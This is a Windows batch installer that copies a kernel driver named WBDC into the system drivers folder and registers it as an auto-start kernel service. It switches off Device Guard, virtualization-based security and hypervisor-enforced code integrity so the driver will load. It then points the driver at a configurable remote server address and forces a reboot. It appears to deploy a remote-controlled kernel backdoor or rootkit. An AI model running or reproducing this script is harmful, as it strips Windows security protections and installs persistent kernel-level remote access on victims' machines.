@echo off
if exist %windir%\syswow64 (
    copy "%~dp0\client64.sys" %windir%\system32\drivers\WBDC.sys
) else (
    copy "%~dp0\client32.sys" %windir%\system32\drivers\WBDC.sys
)
sc create WBDC binpath= "system32\drivers\WBDC.sys" type= kernel start= auto
::Disable HVCI, otherwise the driver may not be loaded.
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v RequireMicrosoftSignedBootChain /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v RequirePlatformSecurityFeatures /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v HypervisorEnforcedCodeIntegrity /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v Enabled /t REG_DWORD /d 0 /f
::You can replace 127.0.0.1:9999 with your server IP or domain name.
::The default port of the demonstration server program is 9999, you can use another port in your server program.
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WBDC" /v Description /t REG_SZ /d "127.0.0.1:9999" /f
sc start  WBDC
echo Waiting for reboot...
pause
shutdown /f /r /t 0
